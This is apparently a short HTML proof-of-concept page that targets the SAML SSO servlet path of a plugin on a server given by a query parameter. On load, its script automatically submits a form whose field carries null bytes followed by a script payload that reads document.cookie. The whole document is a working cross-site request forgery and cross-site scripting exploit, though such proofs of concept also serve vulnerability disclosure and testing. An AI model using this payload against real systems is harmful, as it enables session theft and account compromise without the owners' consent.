<!DOCTYPE html>
<html>
<head>
    <title>Test</title>
</head>
<body>
<form id="form" method="POST" accept-charset="UTF-8">
    <input id="text" type="text" name="test" value=''>
    <input type="submit" name="Submit">
</form>
    <script>
    	const urlParams = new URLSearchParams(window.location.search);
    	const baseUrl = urlParams.get('baseUrl');
        document.getElementById("form").setAttribute("action", baseUrl + "/plugins/servlet/samlsso");

        const payload = `"test>\u0000\u0000\u0000\u0000\u0000\u0000\u0000<script>alert(document.cookie);<\/script>`;
        document.getElementById("text").value = payload;
        document.getElementById("form").submit();
    </script>
</body>
</html>
